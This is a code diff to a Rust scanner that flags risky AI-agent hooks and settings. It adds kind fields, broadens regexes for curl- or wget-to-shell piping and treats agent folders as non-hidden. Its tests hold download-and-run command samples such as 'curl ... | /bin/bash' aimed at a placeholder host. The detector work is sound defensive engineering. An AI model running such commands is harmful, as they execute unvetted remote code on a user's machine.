@@ -71,6 +71,7 @@ pub fn run(analysis: &Analysis<'_>, out: &mut Vec<Candidate>) {
                     let text = rule("RISK-007");
                     out.push(Candidate {
                         rule: "RISK-007",
+                        kind: entry.source().kind,
                         severity: text.severity,
                         title: "Skill can run any command".to_owned(),
                         why: text.why.to_owned(),
@@ -116,6 +117,7 @@ fn server_candidate(
     let text = rule(id);
     Candidate {
         rule: id,
+        kind: entry.source().kind,
         severity: text.severity,
         title,
         why: text.why.to_owned(),
@@ -232,16 +234,18 @@ fn download_and_run(
     static PATTERNS: OnceLock<Vec<(Regex, &'static str)>> = OnceLock::new();
     let patterns = PATTERNS.get_or_init(|| {
         [
+            // The shell may come with `sudo`, a directory (`/bin/bash`) or
+            // `env` in front, and with flags after it.
             (
-                r"\bcurl\b[^|]*\|\s*(?:sudo\s+)?(?:sh|bash|zsh|dash|ksh)\b",
+                r"\bcurl\b[^|]*\|\s*(?:sudo\s+)?(?:\S*/)?(?:env\s+)?(?:sh|bash|zsh|dash|ksh)\b",
                 "Hook pipes curl to sh",
             ),
             (
-                r"\bwget\b[^|]*\|\s*(?:sudo\s+)?(?:sh|bash|zsh|dash|ksh)\b",
+                r"\bwget\b[^|]*\|\s*(?:sudo\s+)?(?:\S*/)?(?:env\s+)?(?:sh|bash|zsh|dash|ksh)\b",
                 "Hook downloads and runs code",
             ),
             (
-                r"\bbase64\s+(?:-d|-D|--decode)\b[^|]*\|\s*(?:sudo\s+)?(?:sh|bash|zsh|dash|ksh)\b",
+                r"\bbase64\s+(?:-d|-D|--decode)\b[^|]*\|\s*(?:sudo\s+)?(?:\S*/)?(?:env\s+)?(?:sh|bash|zsh|dash|ksh)\b",
                 "Hook downloads and runs code",
             ),
             (
@@ -249,7 +253,7 @@ fn download_and_run(
                 "Hook downloads and runs code",
             ),
             (
-                r"\b(?:sh|bash|zsh)\s+<\(\s*(?:curl|wget)\b",
+                r"(?:^|\s|/)(?:sh|bash|zsh|dash|ksh)\s+<\(\s*(?:curl|wget)\b",
                 "Hook downloads and runs code",
             ),
         ]
@@ -263,6 +267,7 @@ fn download_and_run(
     let text = rule("RISK-002");
     out.push(Candidate {
         rule: "RISK-002",
+        kind: entry.source().kind,
         severity: text.severity,
         title: (*title).to_owned(),
         why: text.why.to_owned(),
@@ -288,6 +293,7 @@ fn remote_hook(entry: &ItemEntry, url: &str, location: &Location, out: &mut Vec<
     let text = rule("RISK-003");
     out.push(Candidate {
         rule: "RISK-003",
+        kind: entry.source().kind,
         severity: text.severity,
         title: "Hook posts to a remote URL".to_owned(),
         why: text.why.to_owned(),
@@ -398,16 +404,14 @@ fn suspicious_folder(analysis: &Analysis<'_>, token: &str) -> Option<Folder> {
             relative.strip_prefix("~/").map(str::to_owned)
         });
     if let Some(rest) = home_rest {
-        let rest_path = Path::new(&rest);
-        let mut components = rest_path.components();
-        let first = components.next()?;
-        let Component::Normal(first) = first else {
-            return None;
-        };
-        let first = first.to_string_lossy();
-        if is_agent_dir(analysis, &first) {
+        if in_agent_dir(analysis, &rest) {
             return None;
         }
+        let rest_path = Path::new(&rest);
+        let mut components = rest_path.components();
+        let Component::Normal(_) = components.next()? else {
+            return None;
+        };
         // A well-known tool directory (`~/.nvm`, `~/.cargo`) is the first
         // component; only a hidden folder below it is suspicious.
         return hidden_component(components, rest_path).then_some(Folder::Hidden);
@@ -416,14 +420,19 @@ fn suspicious_folder(analysis: &Analysis<'_>, token: &str) -> Option<Folder> {
     hidden_component(path.components(), path).then_some(Folder::Hidden)
 }
 
-/// Whether the first home component is an agent's own directory (`.claude`,
-/// `.codex`, `.cursor`, `.copilot`, their relocated forms) or the shared
-/// skills folder.
-fn is_agent_dir(analysis: &Analysis<'_>, first: &str) -> bool {
-    if matches!(
-        first,
-        ".claude" | ".codex" | ".cursor" | ".copilot" | ".agents"
-    ) {
+/// Directory names that belong to an agent (or a repository's agent
+/// configuration): never a hidden folder, wherever they sit.
+const AGENT_DIR_NAMES: &[&str] = &[
+    ".claude", ".codex", ".cursor", ".copilot", ".agents", ".github", ".vscode",
+];
+
+/// Whether a home-relative path (`.claude/hooks/x.sh`) sits inside an
+/// agent's own directory: one of the default names at the first level, or
+/// a relocated directory (`CLAUDE_CONFIG_DIR=~/cfg/claude`) by its full
+/// relative path.
+fn in_agent_dir(analysis: &Analysis<'_>, rel: &str) -> bool {
+    let first = rel.split('/').next().unwrap_or_default();
+    if AGENT_DIR_NAMES.contains(&first) {
         return true;
     }
     let dirs = &analysis.scanned.dirs;
@@ -433,8 +442,7 @@ fn is_agent_dir(analysis: &Analysis<'_>, first: &str) -> bool {
             analysis
                 .relative(dir)
                 .strip_prefix("~/")
-                .and_then(|rest| rest.split('/').next())
-                == Some(first)
+                .is_some_and(|prefix| rel == prefix || rel.starts_with(&format!("{prefix}/")))
         })
 }
 
@@ -455,6 +463,7 @@ fn hidden_component(components: std::path::Components<'_>, whole: &Path) -> bool
         name.starts_with('.')
             && name != "."
             && name != ".."
+            && !AGENT_DIR_NAMES.contains(&name.as_str())
             && !(name == ".bin" && i > 0 && names[i - 1] == "node_modules")
     })
 }
@@ -470,6 +479,7 @@ fn claude_setting(entry: &ItemEntry, setting: &Setting, out: &mut Vec<Candidate>
         let text = rule("RISK-004");
         out.push(Candidate {
             rule: "RISK-004",
+            kind: source.kind,
             severity: text.severity,
             title: "Auto-approves every tool".to_owned(),
             why: text.why.to_owned(),
@@ -489,6 +499,7 @@ fn claude_setting(entry: &ItemEntry, setting: &Setting, out: &mut Vec<Candidate>
         let text = rule("RISK-006");
         out.push(Candidate {
             rule: "RISK-006",
+            kind: source.kind,
             severity: text.severity,
             title: "Trusts every project MCP server".to_owned(),
             why: text.why.to_owned(),
@@ -533,6 +544,7 @@ fn codex_config(path: &Path, settings: &[(&Setting, &ItemEntry)], out: &mut Vec<
             }
             out.push(Candidate {
                 rule: "RISK-004",
+                kind: ArtifactKind::Settings,
                 severity: text.severity,
                 title: "Auto-approves every tool".to_owned(),
                 why: text.why.to_owned(),
@@ -555,6 +567,7 @@ fn codex_config(path: &Path, settings: &[(&Setting, &ItemEntry)], out: &mut Vec<
         let text = rule("RISK-005");
         out.push(Candidate {
             rule: "RISK-005",
+            kind: ArtifactKind::Settings,
             severity: text.severity,
             title: "Credentials in a plain file".to_owned(),
             why: text.why.to_owned(),
@@ -600,6 +613,22 @@ mod tests {
         );
         assert_eq!(
             re("bash <(curl -s https://x.example/i.sh)").as_deref(),
+            Some("Hook downloads and runs code")
+        );
+        assert_eq!(
+            re("curl -fsSL https://x.example/i.sh | /bin/bash").as_deref(),
+            Some("Hook pipes curl to sh")
+        );
+        assert_eq!(
+            re("curl -s https://x.example/i.sh | sudo /bin/sh -s").as_deref(),
+            Some("Hook pipes curl to sh")
+        );
+        assert_eq!(
+            re("wget -qO- https://x.example/i.sh | /usr/bin/env bash").as_deref(),
+            Some("Hook downloads and runs code")
+        );
+        assert_eq!(
+            re("/bin/bash <(curl -s https://x.example/i.sh)").as_deref(),
             Some("Hook downloads and runs code")
         );
         assert_eq!(re("npx prettier --write \"$CLAUDE_FILE_PATHS\""), None);
@@ -689,6 +718,11 @@ mod tests {
         assert!(!hidden("_npx/abc/node_modules/.bin/server"), "~/.npm/…");
         assert!(hidden("x/node_modules/.evil/server"));
         assert!(hidden("./.hidden/run.sh"));
+        // A repository's own agent folders are never hidden folders.
+        assert!(!hidden("./.claude/hooks/guard.sh"));
+        assert!(!hidden("/Users/you/proj/p/.claude/hooks/fmt.sh"));
+        assert!(!hidden("proj/p/.github/hooks/x.sh"));
+        assert!(hidden("./.claude/.evil/run.sh"));
     }
 
     fn dummy_entry() -> ItemEntry {
